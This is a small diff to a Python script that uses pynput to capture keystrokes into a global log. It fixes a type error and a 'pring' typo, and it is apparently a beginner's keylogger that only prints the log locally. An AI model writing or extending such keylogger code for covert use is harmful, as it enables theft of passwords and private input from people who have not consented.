@@ -9,9 +9,9 @@ log = "" #init var for storing keystrokes
 
 def process_keypress(key):
     global log #to define global variables
-    log = log + key
+    log = log + str(key) #key is of type KeyType and cannot be concat'ed
     #print(key)
-    pring(log)
+    print(log)
     
 
 keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
